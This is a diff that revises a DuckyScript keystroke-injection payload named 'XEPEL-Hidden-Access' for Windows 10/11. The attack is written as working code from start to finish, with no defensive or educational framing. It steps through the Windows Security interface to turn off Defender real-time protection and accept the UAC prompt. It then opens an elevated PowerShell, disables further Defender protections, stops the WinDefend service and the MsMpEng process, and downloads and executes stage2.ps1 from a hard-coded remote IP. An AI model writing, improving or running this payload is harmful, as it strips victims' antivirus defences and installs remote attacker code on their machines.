@@ -1,6 +1,6 @@
 REM Title: XEPEL-Hidden-Access
 REM Author: XEPEL
-REM Description: Disables Defender RT protection, pulls stage2.ps1 from VPS
+REM Description: Force scroll top, precise RT protection toggle, admin PS execution
 REM Target: Windows 10/11
 
 REM ── Step 1: Open Windows Security ──
@@ -11,40 +11,60 @@ DELAY 500
 ENTER
 DELAY 2000
 
-REM ── Step 2: Click Virus and Threat Protection ──
+REM ── Step 2: Virus and Threat Protection ──
 ENTER
 DELAY 1000
 
-REM ── Step 3: Navigate to Manage Settings ──
-TAB
-TAB
+REM ── Step 3: Manage Settings ──
 TAB
 TAB
 TAB
 DELAY 300
-ENTER
-DELAY 1000
-
-REM ── Step 4: Toggle Real Time Protection OFF ──
-TAB
-DELAY 300
-ENTER
-DELAY 600
-
-REM ── Step 5: UAC prompt – click Yes ──
-LEFT
 ENTER
 DELAY 1500
 
-REM ── Step 6: Close Windows Security ──
-ALT F4
+REM ── Step 4: Force page to top ──
+CTRL HOME
+DELAY 300
+
+REM ── Step 5: TAB once to land on Real Time Protection toggle ──
+TAB
 DELAY 500
 
-REM ── Step 7: Pull and execute stage2.ps1 from VPS ──
-GUI r
-DELAY 600
-STRING powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://153.75.82.198/stage2.ps1')"
-ENTER
-DELAY 600
+REM ── Step 6: Toggle off ──
+SPACE
+DELAY 800
+
+REM ── Step 7: UAC Yes ──
 LEFT
 ENTER
+DELAY 2000
+
+REM ── Step 8: Close Windows Security ──
+ALT F4
+DELAY 800
+
+REM ── Step 9: Open PowerShell as admin ──
+GUI r
+DELAY 800
+STRING powershell
+DELAY 300
+CTRL SHIFT ENTER
+DELAY 2000
+
+REM ── Step 10: UAC Yes for PowerShell ──
+LEFT
+ENTER
+DELAY 2000
+
+REM ── Step 11: Kill remaining Defender processes from admin PS ──
+STRINGLN Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -MAPSReporting 0
+DELAY 500
+STRINGLN Stop-Service WinDefend -Force
+DELAY 500
+STRINGLN Stop-Process -Name MsMpEng -Force
+DELAY 500
+
+REM ── Step 12: Pull and execute stage2.ps1 from VPS ──
+STRINGLN IEX (New-Object Net.WebClient).DownloadString('http://153.75.82.198/stage2.ps1')
+DELAY 500
